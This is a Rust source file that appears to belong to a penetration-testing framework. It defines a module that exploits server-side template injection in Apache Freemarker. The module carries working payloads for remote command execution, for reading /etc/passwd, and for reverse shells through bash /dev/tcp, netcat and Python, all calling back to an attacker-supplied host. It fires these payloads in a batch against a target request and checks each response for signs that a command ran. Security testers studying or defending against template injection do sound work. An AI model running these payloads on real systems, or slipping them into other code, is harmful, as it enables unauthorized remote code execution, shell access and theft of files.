use anyhow::Result;
use async_trait::async_trait;
use chrono::Utc;

use crate::web::{WebModule, ModuleInfo, ModuleContext, ExecutionResult};
use crate::web::injection::{InjectionConfig, InjectionEngine};

pub struct FreemarkerModule;

impl FreemarkerModule {
    pub fn new() -> Self {
        Self
    }
    
    fn get_payloads(&self, context: &ModuleContext) -> Vec<String> {
        let lhost = context.get_option("LHOST").map(|s| s.as_str()).unwrap_or("ATTACKER_IP");
        let lport = context.get_option("LPORT").map(|s| s.as_str()).unwrap_or("4444");
        
        vec![
            // Detection payloads
            "${7*7}".to_string(),
            "${7*'7'}".to_string(),
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }".to_string(),
            
            // Basic RCE
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"whoami\") }".to_string(),
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"cat /etc/passwd\") }".to_string(),
            
            // Reverse shells
            format!("<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${{ ex(\"bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'\") }}", lhost, lport),
            format!("<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${{ ex(\"nc {} {} -e /bin/sh\") }}", lhost, lport),
            format!("<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${{ ex(\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{}\\\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\") }}", lhost, lport),
            
            // Alternative RCE via ObjectConstructor
            "<#assign ob=\"freemarker.template.utility.ObjectConstructor\"?new()><#assign br=ob(\"java.io.BufferedReader\",ob(\"java.io.InputStreamReader\",ob(\"java.lang.Runtime\").getRuntime().exec(\"id\").getInputStream()))>${br.readLine()}".to_string(),
            
            // JMX RCE
            "${\"freemarker.template.utility.JythonRuntime\"?new().exec(\"import os; os.system('id')\")}".to_string(),
            
            // File read
            "<#assign uri=object?api.class.getResource(\"/\").toURI()><#assign input=uri?api.create(\"file:///etc/passwd\").toURL().openConnection()><#assign is=input?api.getInputStream()>FILE:[<#list 0..999999999 as _><#assign byte=is.read()><#if byte == -1><#break></#if>${byte}, </#list>]".to_string(),
        ]
    }
}

#[async_trait]
impl WebModule for FreemarkerModule {
    fn info(&self) -> ModuleInfo {
        ModuleInfo {
            id: "web/ssti/freemarker".to_string(),
            name: "Freemarker SSTI Exploitation".to_string(),
            category: "SSTI".to_string(),
            description: "Server-Side Template Injection exploitation for Apache Freemarker (Java). Includes RCE via Execute utility and reverse shells.".to_string(),
            author: "CAP Framework".to_string(),
            references: vec![
                "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker".to_string(),
                "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#freemarker-java".to_string(),
            ],
            examples: vec![
                "cap web run --module web/ssti/freemarker --request ./requests/template.req --injection-point content --lhost 10.10.14.5 --lport 4444".to_string(),
                "cap web run --module web/ssti/freemarker --request ./requests/template.req --injection-point content --lhost 10.10.14.5 --lport 4444 --dry-run".to_string(),
            ],
        }
    }
    
    fn required_options(&self) -> Vec<String> {
        vec![
            "REQUEST (file path)".to_string(),
            "INJECTION_POINT (parameter name)".to_string(),
            "LHOST (attacker IP)".to_string(),
            "LPORT (attacker port)".to_string(),
        ]
    }
    
    async fn execute(&self, context: &ModuleContext) -> Result<ExecutionResult> {
        let request = context.request.as_ref()
            .ok_or_else(|| anyhow::anyhow!("No request loaded"))?;
        
        let injection_point = context.injection_point.as_ref()
            .ok_or_else(|| anyhow::anyhow!("No injection point set"))?;
        
        let payloads = self.get_payloads(context);
        
        let config = InjectionConfig {
            dry_run: context.get_option("DRY_RUN").map(|s| s == "true").unwrap_or(false),
            confirm_each: context.get_option("CONFIRM_EACH").map(|s| s == "true").unwrap_or(false),
            timeout_secs: 15,
            follow_redirects: false,
        };
        
        let engine = InjectionEngine::new(config)?;
        let results = engine.inject_batch(request, injection_point, &payloads).await?;
        
        let mut findings = Vec::new();
        
        for result in &results {
            if result.response_body.contains("49") {
                findings.push(format!("Template evaluation detected: {}", result.payload));
            }
            
            if result.response_body.contains("uid=") || result.response_body.contains("root:") {
                findings.push(format!("Command execution successful: {}", result.payload));
            }
            
            if result.analysis.has_error_indicators && (
                result.response_body.to_lowercase().contains("freemarker") ||
                result.response_body.contains("TemplateException")
            ) {
                findings.push(format!("Freemarker error detected: {}", result.payload));
            }
        }
        
        Ok(ExecutionResult {
            success: !findings.is_empty(),
            findings,
            injection_results: results,
            module_id: self.info().id,
            timestamp: Utc::now(),
        })
    }
}
